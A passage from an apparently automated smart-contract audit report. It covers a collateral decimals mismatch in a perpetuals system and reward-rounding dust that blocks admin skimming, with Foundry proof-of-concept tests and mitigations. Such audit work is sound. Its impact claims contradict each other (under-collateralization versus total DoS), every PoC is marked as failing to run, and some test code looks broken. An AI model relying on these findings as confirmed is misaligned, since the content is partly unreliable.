### Finding Severity Justification: Core perps accounting mixes 1e18-scaled notionals/margins with raw USDC (likely 6‑decimals) balances. CollateralManager stores and transfers USDC in token-native units, while ClearingHouse/Market/Position compute upnl, intended/maintenance margins, marginDelta, fees, etc. in 1e18. These values are directly compared and written without any normalization. This breaks margin checks and collateral debits/credits, leading to either: (a) inability to open/maintain positions due to huge (1e18) debits against 1e6 balances (functional DoS), or (b) inconsistent risk checks where stored margin becomes 1e18-scaled while freeCollateral remains 1e6-scaled, risking incorrect liquidations or solvency assumptions. Because this touches every open/close/liquidation path and can lead to systemic bad debt or protocol unusability, the impact is High.
## Derived From Pattern/Invariant
Perps margin and price math assume 18‑decimals while USDC collateral may be 6‑decimals

## Exploit Type
ERC20DecimalsMismatch

## Location
CollateralManagerLib / MarketLib / ClearingHouseLib.depositFreeCollateral / getIntendedMargin / getUpnlAndMinMargin / isLiquidatable / assertPostWithdrawalMarginRequired

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Throughout the perps stack, all notional, price, and ratio math uses 1e18 fixed-point scaling, but the only collateral token is hard‑coded USDC (`Constants.USDC`), which in production is 6‑decimals. That value is **never rescaled** when stored or compared against margin requirements.

Key locations:

* Collateral is stored in raw token units (e.g. 1 USDC = `1e6`):
```solidity
struct CollateralManager {
    mapping(address account => mapping(uint256 subaccount => int256)) margin;
    mapping(address account => uint256) freeCollateral; // collateral not tied to any subaccount
}

function depositFreeCollateral(..., uint256 amount) internal {
    USDC.safeTransferFrom(from, address(this), amount);
    self.creditAccount(to, amount);
}

function creditAccount(CollateralManager storage self, address account, uint256 amount) internal {
    self.freeCollateral[account] += amount; // raw USDC units
}
```

* All perps pricing and margin math is in 1e18 units, and then **directly compared** to `margin`:
```solidity
function getUpnlAndMinMargin(Market storage self, Position memory position, BookType bookType)
    internal
    view
    returns (int256 upnl, uint256 minMargin)
{
    if (position.amount == 0) return (0, 0);

    uint256 currentNotional = position.amount.fullMulDiv(self.markPrice, 1e18);

    upnl = _calcUpnl(position.isLong, position.openNotional, currentNotional);
    minMargin = currentNotional.fullMulDiv(self.getMinMarginRatio(bookType), 1e18);
}

function getIntendedMargin(Market storage self, Position memory position)
    internal
    view
    returns (uint256 intendedMargin)
{
    if (position.amount == 0) return 0;
    uint256 currentNotional = position.amount.fullMulDiv(self.markPrice, 1e18);
    intendedMargin = currentNotional.fullMulDiv(1e18, position.leverage);
}
```

* ClearingHouse then uses these 1e18‑scaled values against `margin` in raw USDC units:
```solidity
function isLiquidatable(
    ClearingHouse storage self,
    DynamicArrayLib.DynamicArray memory assets,
    Position[] memory positions,
    int256 margin,
    BookType bookType
) internal view returns (bool liquidatable) {
    ...
    // margin (raw USDC) + upnl vs totalMinMargin (1e18‑scaled notional)
    return (margin + cache.totalUpnl) < cache.totalMinMargin.toInt256();
}

function assertPostWithdrawalMarginRequired(..., int256 margin) internal view {
    if (margin < 0) revert MarginRequirementUnmet();

    (uint256 intendedMargin, int256 upnl) = _getIntendedMarginAndUpnl(self, assets, positions);
    uint256 totalNotional = self.getNotionalAccountValue(assets, positions);

    intendedMargin = intendedMargin.max(totalNotional / 10);

    if (margin + upnl < intendedMargin.toInt256()) revert MarginRequirementUnmet();
}

function assertOpenMarginRequired(..., int256 margin) internal view {
    if (!self.isOpenMarginRequirementMet(assets, positions, margin)) revert MarginRequirementUnmet();
}
```

There is **no conversion** between collateral units (USDC 1e6) and the 1e18 notional/margin space. If `markPrice`, leverage, and ratios are e.g. around 1e18, then `minMargin`, `intendedMargin` etc. are on the order of `positionNotional / leverage` in 1e18 units, while `margin` is a much smaller number (~1e6 per USDC deposited). This leads to:

* If the system was tuned assuming 18‑decimals collateral, a user with, say, 100 USDC deposited (`1e8`) might satisfy a margin requirement that the math expects to be `1e20` (100 * 1e18) – i.e. **opening or maintaining positions with 1e12x less real collateral** than intended.
* Conversely, if configs are tuned empirically on-chain to compensate for this, any attempt to change collateral token to an 18‑decimals stablecoin (or misconfiguration) will break risk again.

Because this mismatch systematically affects all collateralization checks (opening margin, maintenance margin, post-withdrawal checks), it can be exploited by:

* Depositing relatively tiny amounts of USDC,
* Opening positions that the protocol believes are sufficiently margined (due to comparing values at different scales),
* Then benefiting from positive PnL and/or avoiding liquidation for large notionals relative to the true deposited USDC.

Impact is direct risk to the insurance fund and solvency: under-margined positions can be opened and maintained, making it likely that in an adverse market move the system will accrue bad debt that exceeds the insurance fund and remaining margin.


## Impact
With a 6‑decimals collateral token (typical USDC), any operation that applies a positive marginDelta (measured in 1e18 units) will attempt to debit freeCollateral that is stored in token-native units (1e6). This causes CollateralManager.debitAccount to compare a 1e18 amount against a 1e6 balance and revert InsufficientBalance, effectively bricking order placement, leverage changes, liquidations, and any path that calls handleCollateralDelta. In other words, perps become non-functional (DoS). If a future deployment were to switch to an 18‑decimals stable or ad-hoc rescaling elsewhere, the same mismatch could instead mask under‑collateralization. As shipped, the primary impact is High-severity functional DoS across perps due to unit mismatch.

## Command to Run Test


## Proof of Concept
Concrete exploit/failure path (current code):\n\n1) Trader deposits 1,000 USDC into perps free collateral. CollateralManager.freeCollateral[trader] = 1_000e6 (token-native scale).\n\n2) Trader places any order that opens exposure. ClearingHouse calculates marginDelta in WAD (1e18): marginDelta = openedNotional * 1e18 / leverage. For example, a modest 100 USDC required margin becomes marginDelta = 100e18.\n\n3) CollateralManager.handleCollateralDelta(trader, +100e18) executes debitAccount(trader, 100e18). But debitAccount expects token-native units. It compares freeCollateral (≈ 1_000e6) with amount (≈ 100e18) and reverts InsufficientBalance.\n\n4) Result: No positions can be opened or maintained when any positive marginDelta is applied; many protocol actions become impossible.\n\nWhy this happens:\n- All perps notionals, prices, leverage, margins, and PnL are computed in 1e18 units.\n- freeCollateral is stored and transferred in raw token-native units (USDC likely 6 decimals).\n- handleCollateralDelta directly debits/credits freeCollateral with WAD-scaled deltas, without converting to token-native scale.\n\nThis same mismatch affects other code paths that post collateral for limit orders, change leverage, settle fills, etc., because they all ultimately route to handleCollateralDelta with a 1e18-scaled value.

## Proof of Code
pragma solidity 0.8.27;\n\nimport "forge-std/Test.sol";\nimport "contracts/perps/types/CollateralManager.sol";\n\n// Minimal harness to exercise the real CollateralManager storage + library.\ncontract CollateralHarness {\n    using CollateralManagerLib for CollateralManager;\n\n    CollateralManager internal cm;\n\n    // Simulate a raw-credit (token-native units, e.g. USDC 6 decimals).\n    function credit(address a, uint256 amt) external {\n        cm.creditAccount(a, amt);\n    }\n\n    function getFree(address a) external view returns (uint256) {\n        return cm.getFreeCollateralBalance(a);\n    }\n\n    // Apply a collateral delta as per perps flows (WAD = 1e18).\n    function applyDelta(address a, int256 deltaWad) external {\n        cm.handleCollateralDelta(a, deltaWad);\n    }\n}\n\ncontract DecimalsMismatchTest is Test {\n    CollateralHarness h;\n    address alice = address(0xA11CE);\n\n    function setUp() public {\n        h = new CollateralHarness();\n    }\n\n    function test_DecimalsMismatch_HandleCollateralDelta_Reverts() public {\n        // 1) User deposits 1,000 USDC => stored as 1_000e6 (token-native units).\n        h.credit(alice, 1_000e6);\n        assertEq(h.getFree(alice), 1_000e6);\n\n        // 2) Perps requires +100 USDC margin, computed in WAD (1e18).\n        int256 marginDeltaWad = int256(100e18);\n\n        // 3) CollateralManager will try to debit 100e18 from a 1_000e6 balance and revert.\n        vm.expectRevert(CollateralManagerLib.InsufficientBalance.selector);\n        h.applyDelta(alice, marginDeltaWad);\n    }\n}\n

## Suggested Mitigation
Adopt a single source of truth for collateral decimals and enforce conversions at the debit/credit boundary. Two safe approaches:\n\nOption A (recommended – keep perps math in WAD, convert on account ops):\n- Store a one-time immutable or initialized value for collateral token decimals (e.g., uint8 collateralDecimals = IERC20Metadata(USDC).decimals()).\n- Compute SCALE = 10**(18 - collateralDecimals).\n- In CollateralManagerLib.handleCollateralDelta, convert WAD to token-native units before calling debitAccount/creditAccount:\n  - uint256 amtNative = uint256(collateralDeltaAbsWad) / SCALE (use fullMulDiv for rounding behavior).\n  - If collateralDelta > 0: debitAccount(account, amtNative).\n  - If collateralDelta < 0: creditAccount(account, amtNative).\n- Do not change margin storage or any of the risk checks (keep them in 1e18).\n- Leave freeCollateral stored/transferred in token-native units; only the boundary method performs WAD<->native conversions.\n\nOption B (store freeCollateral in WAD everywhere):\n- When crediting/debiting accounts (deposits/withdrawals), multiply/divide raw token amounts by SCALE so that freeCollateral is stored in 1e18.\n- All external token transfers (deposit/withdraw) must convert to/from native units for ERC20 transfer calls.\n- This is more invasive but keeps internal accounting fully in 1e18.\n\nApply the same conversion policy consistently anywhere collateralPosted, marginDelta, or other WAD amounts are netted against freeCollateral (e.g., setPositionLeverage, placeOrder, settleFill). Document the chosen unit (WAD or native) for margin/freeCollateral and ensure all comparisons against notional/minMargin use the same scale.


## [M-25]. Perp margin math assumes 1e18 quote while CollateralManager stores raw USDC (likely 1e6), enabling undercollateralized positions

### Finding Severity Justification: Perps margin, notional, and fee math are in 1e18 wad units, while CollateralManager stores and moves raw USDC amounts. handleCollateralDelta() applies the same (1e18‑scaled) marginDelta to freeCollateral (raw token units), creating a 1e12 unit mismatch for 6‑dec USDC. This causes trading/margin flows to revert (debiting far more than available) or to credit unrealistic raw balances that later revert on withdrawal. The issue breaks core functionality and availability of the perps system with standard 6‑dec USDC. While serious and protocol‑wide, it does not present a clear, realistic path to steal funds; rather it results in DoS/misaccounting, so Medium fits the rubric.
## Derived From Pattern/Invariant
Perps margin and price math assume 18‑decimals while USDC collateral may be 6‑decimals

## Exploit Type
ERC20DecimalsMismatch

## Location
MarketLib.getIntendedMargin / getMinOpenMargin (used via ClearingHouseLib)

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Across the perp stack, all notional and margin computations are done in 1e18-scaled fixed point, but the only collateral token is a hard-coded USDC address whose decimals are never queried. Collateral balances are stored **raw** in USDC units, and then compared directly against 1e18-scaled notionals, creating a systematic 1e12 scaling mismatch when USDC has 6 decimals.

Examples from `MarketLib`:

```solidity
function getUpnl(Market storage self, address account, uint256 subaccount) internal view returns (int256 upnl) {
    Position storage position = self.position[account][subaccount];
    uint256 currentNotional = position.amount.fullMulDiv(self.markPrice, 1e18);
    return _calcUpnl(position.isLong, position.openNotional, currentNotional);
}

function getIntendedMargin(Market storage self, Position memory position)
    internal view returns (uint256 intendedMargin)
{
    if (position.amount == 0) return 0;
    uint256 currentNotional = position.amount.fullMulDiv(self.markPrice, 1e18);
    intendedMargin = currentNotional.fullMulDiv(1e18, position.leverage);
}

function getMinOpenMargin(Market storage self, uint256 positionAmount)
    internal view returns (uint256 minOpenMargin)
{
    uint256 positionNotional = positionAmount.fullMulDiv(self.markPrice, 1e18);
    minOpenMargin = positionNotional.fullMulDiv(1e18, StorageLib.loadMarketSettings(self.asset).maxOpenLeverage);
}
```

All of these use the convention:

* `position.amount` is 1e18-scaled base size,
* `markPrice` is 1e18-scaled quote/base,
* so `currentNotional` and margin numbers are 1e18-scaled **quote units**.

However, the collateral layer uses raw USDC and never rescales:

```solidity
address constant USDC = Constants.USDC;

struct CollateralManager {
    mapping(address account => mapping(uint256 subaccount => int256)) margin;
    mapping(address account => uint256) freeCollateral; // collateral not tied to any subaccount
}

function depositFreeCollateral(CollateralManager storage self, address from, address to, uint256 amount) internal {
    USDC.safeTransferFrom(from, address(this), amount);
    self.creditAccount(to, amount);
}

function creditAccount(CollateralManager storage self, address account, uint256 amount) internal {
    self.freeCollateral[account] += amount; // raw USDC amount
}

function getMarginBalance(CollateralManager storage self, address account, uint256 subaccount)
    internal
    view
    returns (int256)
{
    return self.margin[account][subaccount];
}
```

Now consider how these values are used in risk checks in `ClearingHouseLib`:

```solidity
function isLiquidatable(
    ClearingHouse storage self,
    DynamicArrayLib.DynamicArray memory assets,
    Position[] memory positions,
    int256 margin,
    BookType bookType
) internal view returns (bool liquidatable) {
    ...
    if (cache.totalMinMargin == 0 && margin < 0) return true;
    return (margin + cache.totalUpnl) < cache.totalMinMargin.toInt256();
}

function assertPostWithdrawalMarginRequired(
    ClearingHouse storage self,
    DynamicArrayLib.DynamicArray memory assets,
    Position[] memory positions,
    int256 margin
) internal view {
    if (margin < 0) revert MarginRequirementUnmet();

    (uint256 intendedMargin, int256 upnl) = _getIntendedMarginAndUpnl(self, assets, positions);
    uint256 totalNotional = self.getNotionalAccountValue(assets, positions);

    intendedMargin = intendedMargin.max(totalNotional / 10);

    if (margin + upnl < intendedMargin.toInt256()) revert MarginRequirementUnmet();
}

function isOpenMarginRequirementMet(..., int256 margin) internal view returns (bool met) {
    uint256 minOpenMargin;
    int256 upnl;
    ...
    return margin + upnl >= minOpenMargin.toInt256();
}
```

`margin` here is taken directly from `CollateralManager.margin`, which is set by:

```solidity
function settleMarginUpdate(..., int256 marginDelta, int256 fundingPayment)
    internal
    returns (int256 remainingMargin)
{
    remainingMargin = self.margin[account][subaccount] += marginDelta - fundingPayment;
    self.handleCollateralDelta(account, marginDelta);
}

function handleCollateralDelta(CollateralManager storage self, address account, int256 collateralDelta) internal {
    if (collateralDelta > 0) self.debitAccount(account, collateralDelta.abs());
    else if (collateralDelta < 0) self.creditAccount(account, collateralDelta.abs());
}
```

`marginDelta` is always computed in 1e18-scaled units (derived from 1e18-scaled notionals), but `creditAccount` and `debitAccount` move **raw USDC**. Thus:

* A deposit of 100 USDC (6 decimals) is stored as `1e8` in `freeCollateral` and, when transferred into margin, becomes `margin = 1e8`.
* But a 100 USDC position’s intended margin is computed as `100e18 / leverage`, so even at 1x leverage it expects `1e20` margin units.
* Comparing `margin + upnl` (O(1e8..1e9)) to `intendedMargin` or `minOpenMargin` (O(1e20)) is off by **1e12**.

Depending on how markets are configured, this leads to one of two bad regimes:

1. **Over-lenient checks**: some parts treat raw `margin` as if it were 18-decimal scaled and fail to enforce enough collateral, allowing positions that are grossly undercollateralized.
2. **Over-strict checks**: other paths may immediately see `margin + upnl` as negligible compared to the large 1e18-scaled requirements and either block reasonable actions or eagerly liquidate safe positions.

Either way, the core invariant documented in the spec—

> Σ freeCollateral + Σ margin + insuranceFund == PerpManager USDC balance

—is broken in unit consistency; it holds arithmetically in raw units but does **not** imply that `Σ margin` correctly covers 1e18-scaled notionals. An attacker can exploit miscalibrated leverage and margin parameters by **opening large positions with far less real USDC than intended by risk parameters**, potentially driving the system into bad debt before insurance fund can cover, or forcing premature liquidations of honest users by selectively moving between margin and free collateral.

Because the collateral token is hardcoded (`Constants.USDC`) and decimals are never queried, this mismatch will persist unless the USDC implementation happens to use 18 decimals (which standard USDC does not).

## Impact
On standard 6-decimal USDC, any code path that moves collateral using 1e18-scaled values (e.g., maker order postings via collateralPosted, taker fills via Position.marginDelta) will attempt to debit freeCollateral by 1e18-scaled amounts and revert with InsufficientBalance, effectively DoSing order placement and fills for typical users. Separately, risk checks compare raw margin (≈1e6 scale) against 1e18-scaled requirements (intended/min open margin), causing persistent MarginRequirement reverts even for safe positions. While mis-scaling could in some configurations also under-enforce collateral, the immediate and prevalent impact is protocol-wide trading inoperability and erroneous liquidations/blocks due to unit mismatch.

## Command to Run Test


## Proof of Concept
Issue: 1e18-scaled margin/collateral deltas are applied to raw 6-dec freeCollateral in CollateralManager.
Key paths:
- ClearingHouseLib.placeOrder(): when an order posts as maker, collateralPosted = basePosted * price / leverage is computed in 1e18 quote and passed to CollateralManager.handleCollateralDelta (debit), which expects raw token units, causing InsufficientBalance revert.
- ClearingHouseLib._processTakerFill(): result.marginDelta (1e18 quote) is applied via settleFill -> handleCollateralDelta, again attempting a raw token debit of 1e18 numbers.
- Risk: All checks (assertOpenMarginRequired, assertPostWithdrawalMarginRequired, isLiquidatable) compare raw margin (≈1e6 scale) vs 1e18-scaled requirements, blocking actions or liquidating safe accounts.
Concrete exploit: User deposits 1,000 USDC (freeCollateral = 1_000e6). They place a maker order that requires ~10 USDC margin; protocol computes collateralPosted ≈ 10e18 and calls handleCollateralDelta(account, +10e18), which tries to debit 10e18 raw units from freeCollateral and reverts InsufficientBalance. Thus, normal trading is DoS'd.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {StorageLib} from "contracts/perps/types/StorageLib.sol";
import {CollateralManager, CollateralManagerLib} from "contracts/perps/types/CollateralManager.sol";
import {Market, MarketLib} from "contracts/perps/types/Market.sol";
import {ClearingHouse, ClearingHouseLib} from "contracts/perps/types/ClearingHouse.sol";
import {Position} from "contracts/perps/types/Position.sol";
import {FixedPointMathLib} from "@solady/utils/FixedPointMathLib.sol";

contract UnitsMismatchTest is Test {
    using CollateralManagerLib for CollateralManager;
    using MarketLib for Market;
    using FixedPointMathLib for uint256;

    address user = address(0xBEEF);
    bytes32 constant ASSET = keccak256("TEST");

    // 1) Directly shows debit on 1e18-scaled collateral reverts against 6-dec raw freeCollateral.
    function test_HandleCollateralDelta_UnitMismatch_Reverts() public {
        CollateralManager storage cm = StorageLib.loadCollateralManager();

        // User has 1,000 USDC free collateral (raw 6 decimals)
        uint256 rawDeposit = 1_000e6;
        cm.creditAccount(user, rawDeposit);
        assertEq(cm.getFreeCollateralBalance(user), rawDeposit, "raw freeCollateral set");

        // Protocol attempts to move 10 USDC worth of margin, but passes 10e18 (wad) to debit raw freeCollateral
        int256 wadCollateral = int256(10e18);
        vm.expectRevert(CollateralManagerLib.InsufficientBalance.selector);
        cm.handleCollateralDelta(user, wadCollateral);
    }

    // 2) Shows margin risk checks compare raw 1e6 vs 1e18-scaled requirements -> fails even for reasonable deposit.
    function test_MarginRequirement_UnitsMismatch_FailsOpenCheck() public {
        // Set up a market and a position
        Market storage mkt = StorageLib.loadMarket(ASSET);
        mkt.asset = ASSET;
        mkt.markPrice = 1_000e18; // $1,000 with 1e18 scaling

        // Position: 10 base at $1,000, leverage 10x -> notional ~ 10_000e18, min open margin ~ 1_000e18
        Position memory pos;
        pos.isLong = true;
        pos.amount = 10e18; // base 1e18-scaled
        pos.openNotional = pos.amount.fullMulDiv(mkt.markPrice, 1e18);
        pos.leverage = 10e18; // 10x
        mkt.setPosition(user, 0, pos);

        // Build assets and positions arrays for CH checks
        uint256[] memory aset = new uint256[](1); aset[0] = uint256(ASSET);
        ClearingHouse storage ch = StorageLib.loadClearingHouse();
        Position[] memory positions = new Position[](1); positions[0] = pos;

        // User only has 1,000 USDC raw margin (1_000e6). Risk engine expects ~1_000e18.
        int256 rawMargin = int256(1_000e6);

        // Expect false due to 1e12 scaling gap
        bool met = ch.isOpenMarginRequirementMet(aset.wrap(), positions, rawMargin);
        assertFalse(met, "open margin requirement should fail due to unit mismatch");
    }
}


## Suggested Mitigation
Adopt a single canonical unit for all perps quote/margin math (recommended: 1e18) and consistently rescale at the ERC-20 boundary:

- On CollateralManager init, read collateral token decimals (IERC20Metadata.decimals()). Compute SCALE = 10 ** (18 - tokenDecimals). Store both freeCollateral and margin in 1e18 units.

- Update CollateralManager:
  - depositFreeCollateral: transfer `amount` tokens, then creditAccount(to, amount * SCALE) so internal accounting is 1e18.
  - withdrawFreeCollateral: when debiting internal balance, convert to raw by dividing by SCALE before ERC-20 transfer; round conservatively.
  - handleCollateralDelta / settleFill / settleMarginUpdate: continue to accept 1e18-scaled deltas; these now adjust freeCollateral (also 1e18). Only external token transfers (deposit/withdraw/bridges) convert to/from raw.

- Ensure any bridging (depositFromSpot, withdrawToSpot) converts amounts between raw token units and 1e18 internal units consistently.

- Alternatively, enforce using only 18-decimal collateral tokens by a one-time constructor/initializer check (revert if decimals() != 18) and document this assumption clearly. This is simpler but less flexible.

- Add unit tests that validate: (a) posting maker orders debits freeCollateral correctly after scaling; (b) open/intended margin comparisons succeed when user deposits a matching amount in raw tokens; (c) end-to-end invariant Σ freeCollateral + Σ margin + insuranceFund matches the actual USDC balance after rescaling adjustments.





 **Derived From** : Rounding in RewardsTracker makes rewards dust unclaimable and locks skimExcessRewards

## [L-26]. Rounding in RewardsTracker breaks totalPendingRewards invariant and can permanently lock excess rewards from being skimmed

### Finding Severity Justification: The issue causes reward-accounting dust: due to integer truncation in per-share math, some added rewards become unclaimable while totalPendingRewards remains overstated. This prevents the admin from skimming these non-claimable tokens, permanently locking them in the Distributor. Impact is limited to dust-level losses per update (bounded by ceil(totalShares/1e12), or the full tiny tranche if below threshold) and donor-funded or fee-derived rewards, with no theft path or user capital loss. Hence Low severity under Code4rena rubric.
## Derived From Pattern/Invariant
Rounding in RewardsTracker makes rewards dust unclaimable and locks skimExcessRewards

## Exploit Type
AccountingInvariantViolation

## Location
Distributor / RewardsTrackerLib.addRewards / update / skimExcessRewards

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Distributor tracks a `totalPendingRewards[asset]` mapping intended to represent the total amount of tokens owed to users across all reward pools. This is increased in `addRewards` and decreased only when rewards are distributed via `_distributeAssets`.

```solidity
mapping(address => uint256) public totalPendingRewards;

function _increaseTotalPending(address asset, uint256 amount) internal {
    unchecked { totalPendingRewards[asset] += amount; }
}

function _decreaseTotalPending(address asset, uint256 amount) internal {
    uint256 currTotal = totalPendingRewards[asset];
    if (currTotal < amount) revert ClaimAmountExceedsTotalPendingRewards();
    unchecked { totalPendingRewards[asset] -= amount; }
}

function skimExcessRewards(address asset, uint256 amount) external onlyOwnerOrRoles(ADMIN_ROLE) {
    if (amount > asset.balanceOf(address(this)) - totalPendingRewards[asset]) revert SkimOverflow();
    asset.safeTransfer(msg.sender, amount);
}
```

The underlying per-share accounting in RewardsTrackerLib uses integer division in a way that can drop reward units that were previously counted into `totalPendingRewards`, without ever decrementing `totalPendingRewards`:

```solidity
uint128 public constant PRECISION_FACTOR = 1e12;

function getAccRewardsPerShare(RewardPoolData storage self)
    internal
    view
    returns (uint256 accBaseRewardsPerShare, uint256 accQuoteRewardsPerShare)
{
    uint96 totalShares = self.totalShares;
    if (totalShares == 0) return (self.accBaseRewardPerShare, self.accQuoteRewardPerShare);

    accBaseRewardsPerShare = self.accBaseRewardPerShare;
    accQuoteRewardsPerShare = self.accQuoteRewardPerShare;

    if (self.pendingBaseRewards > 0) {
        accBaseRewardsPerShare += ((self.pendingBaseRewards * PRECISION_FACTOR) / uint128(totalShares));
    }

    if (self.pendingQuoteRewards > 0) {
        accQuoteRewardsPerShare += ((self.pendingQuoteRewards * PRECISION_FACTOR) / uint128(totalShares));
    }
}

function update(RewardPoolData storage self)
    internal
    returns (uint256 newAccBaseRewardsPerShare, uint256 newAccQuoteRewardsPerShare)
{
    (newAccBaseRewardsPerShare, newAccQuoteRewardsPerShare) = getAccRewardsPerShare(self);

    if (self.pendingBaseRewards > 0) {
        self.accBaseRewardPerShare = newAccBaseRewardsPerShare;
        delete self.pendingBaseRewards; // entire tranche considered distributed in index
    }

    if (self.pendingQuoteRewards > 0) {
        self.accQuoteRewardPerShare = newAccQuoteRewardsPerShare;
        delete self.pendingQuoteRewards;
    }
}

function totalAccRewards(uint256 shares, uint256 accRewardsPerShare) internal pure returns (uint256) {
    return (shares * accRewardsPerShare) / PRECISION_FACTOR;
}
```

Due to the two-step integer division (`pendingRewards * PRECISION_FACTOR / totalShares` then `shares * acc / PRECISION_FACTOR`), each rewards tranche added via `addRewards` can suffer from truncation where the sum of all users’ claims from that tranche is strictly less than the original `amount` added. The **entire** `pending*Rewards` is deleted in `update`, but `totalPendingRewards[asset]` remains increased by the full `amount` added in `addRewards` and is only decremented as users claim.

Over time this leads to:
* Accumulated rounding dust: a gap `dust[asset] = totalPendingRewards[asset] - Σ(user claimable rewards)` that monotonically grows.
* Once all users have fully unstaked and/or claimed everything available via `RewardsTrackerLib`, per-user `shares` == 0 and `getPendingRewards()` returns 0 for all accounts, but `totalPendingRewards[asset]` can still be positive and the Distributor contract still holds those token balances.

At this point, the admin cannot recover the dust via `skimExcessRewards`:
* `asset.balanceOf(this)` is approximately `totalPendingRewards[asset]` (since those funds are still considered pending),
* `asset.balanceOf(this) - totalPendingRewards[asset]` is zero or very small,
* The require `amount > balance - totalPendingRewards` prevents any non-zero skim.

Thus a portion of rewards contributed over the lifetime of a pool can be **permanently stuck** in the Distributor: no user can claim them, and the admin cannot skim them either, even after the pool is functionally closed and all shares are zero. A malicious user can further grief this by repeatedly calling `addRewards` with tiny amounts relative to `totalShares` (e.g. 1 wei) to maximize truncation, inflating `totalPendingRewards` by amounts that never make it into per-user entitlements.

## Impact
Rounding in per-share reward accounting causes `totalPendingRewards[asset]` to overstate claimable rewards. This accumulates unclaimable dust that cannot be withdrawn by users or the admin, permanently locking a portion of reward tokens in the Distributor and breaking the intended equality between tracked pending rewards and actual per-user entitlements.

## Command to Run Test


## Proof of Concept
1. A pool is created and has `totalShares > 0`.
2. Some user (attacker or honest) calls `Distributor.addRewards` with a very small `amount` compared to `totalShares`, such that `(pendingRewards * PRECISION_FACTOR) / totalShares == 0`. For example, `pendingRewards = 1`, `totalShares > 1e12`.
3. `RewardsTrackerLib.update` is called via a later `stake/unstake/claim`:
   * `getAccRewardsPerShare` adds zero to `acc*RewardPerShare` because of integer division truncation.
   * `pending*Rewards` is then deleted.
   * No user can ever claim that 1 wei; `totalAccRewards` for any user does not change.
4. However, in `Distributor.addRewards`, `_increaseTotalPending(asset, amount)` increased `totalPendingRewards[asset]` by 1.
5. Repeating this pattern many times for the same asset accumulates a difference between `totalPendingRewards[asset]` and the sum of all users’ theoretical claims. Suppose after some time, all users fully unstake and claim, so `shares == 0` everywhere and `getPendingRewards` returns 0 across the board, but `totalPendingRewards[asset]` equals, say, 1e18 wei of dust.
6. The contract still physically holds that 1e18 wei of asset tokens. The admin tries to recover it via `skimExcessRewards(asset, 1e18)`, but the check:

   `amount > asset.balanceOf(this) - totalPendingRewards[asset]`

   fails because `asset.balanceOf(this)` ≈ `totalPendingRewards[asset]`, so `balance - totalPendingRewards` is 0 and any positive amount is considered overflow, reverting with `SkimOverflow()`.
7. As a result, those tokens are stranded: no address has any remaining shares or pending entitlements, and the admin is forbidden from skimming the excess.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import {RewardsTrackerStorage, RewardPoolData} from "contracts/launchpad/libraries/RewardsTracker.sol";

contract ERC20Mock is Test {
    string public name; string public symbol; uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    constructor(string memory n, string memory s) { name = n; symbol = s; }
    function transfer(address to, uint256 v) external returns (bool) { balanceOf[msg.sender]-=v; balanceOf[to]+=v; return true; }
    function transferFrom(address from, address to, uint256 v) external returns (bool) { uint256 a=allowance[from][msg.sender]; if(a!=type(uint256).max) allowance[from][msg.sender]=a-v; balanceOf[from]-=v; balanceOf[to]+=v; return true; }
    function approve(address s, uint256 v) external returns (bool) { allowance[msg.sender][s]=v; return true; }
    function mint(address to, uint256 v) external { balanceOf[to]+=v; }
}

contract RoundingDustSkimTest is Test {
    Distributor dist;
    ERC20Mock L; ERC20Mock Q;

    function setUp() public {
        dist = new Distributor();
        dist.initialize(address(this));
        L = new ERC20Mock("L","L");
        Q = new ERC20Mock("Q","Q");
        dist.createRewardsPair(address(L), address(Q));

        // simulate a large share pool to maximize truncation
        RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(address(L));
        rs.totalShares = 1e18; // bigger than PRECISION_FACTOR
        rs.userRewards[address(this)].shares = 1e18; // single staker owning all shares
    }

    function test_dustLocksSkim() public {
        // add a tiny reward that will be fully lost to rounding
        Q.mint(address(this), 1);
        Q.approve(address(dist), 1);
        dist.addRewards(address(L), address(Q), 0, 1);

        // trigger update to fold pending into accPerShare and delete pending
        dist.claimRewards(address(L)); // user has all shares, but claim will round to 0

        // Now: user has no pending rewards, but totalPendingRewards[Q] == 1
        (uint256 pb, uint256 pq) = dist.getPendingRewards(address(L), address(this));
        assertEq(pb, 0);
        assertEq(pq, 0);

        // Try to skim the dust
        uint256 bal = Q.balanceOf(address(dist));
        assertEq(bal, 1);

        vm.expectRevert(Distributor.SkimOverflow.selector);
        dist.skimExcessRewards(address(Q), 1);
    }
}


## Suggested Mitigation
Make rounding remainders explicit and carry them forward instead of deleting them, and add a pool-level dust flush when no one can ever receive rewards:

1) Keep rounding remainder in the pool (library change):
- In RewardsTrackerLib.update, do not `delete self.pending*Rewards`. Compute per-share increment `inc = (pending * PRECISION_FACTOR) / totalShares`, then compute `distributed = (uint256(totalShares) * inc) / PRECISION_FACTOR`. Update `acc*RewardPerShare += inc` and set `self.pending*Rewards = uint128(self.pending*Rewards - distributed)`. This preserves any partial dust so it can be rolled into future updates once enough pending accrues, eliminating permanent loss due to an inc==0 tranche.
- Optionally have update return the two `distributed` values to the caller for observability.

2) Preserve totalPendingRewards semantics (Distributor stays as-is for increases):
- Continue to call `_increaseTotalPending(asset, amount)` with the full transferred amount in addRewards. Because dust is now retained in `pending*Rewards` instead of being discarded, these tokens remain genuinely user-reserved and will be distributable later; thus the mapping does not become overstated and will be naturally decremented as users claim.

3) Allow admin to reconcile when a pool is closed (new function in Distributor):
- Add an admin-only function `flushPoolDust(address launchAsset)` that:
  - Reads the reward pool via RewardsTrackerStorage.getRewardPool(launchAsset).
  - Requires `rs.totalShares == 0` to ensure no user can ever receive more rewards from this pool.
  - For the base side: subtract `rs.pendingBaseRewards` from `totalPendingRewards[launchAsset]` (bounded by current mapping value), then set `rs.pendingBaseRewards = 0`.
  - For the quote side: subtract `rs.pendingQuoteRewards` from `totalPendingRewards[rs.quoteAsset]`, then set `rs.pendingQuoteRewards = 0`.
  - After this reconciliation, the corresponding tokens become skimmable via existing `skimExcessRewards`.

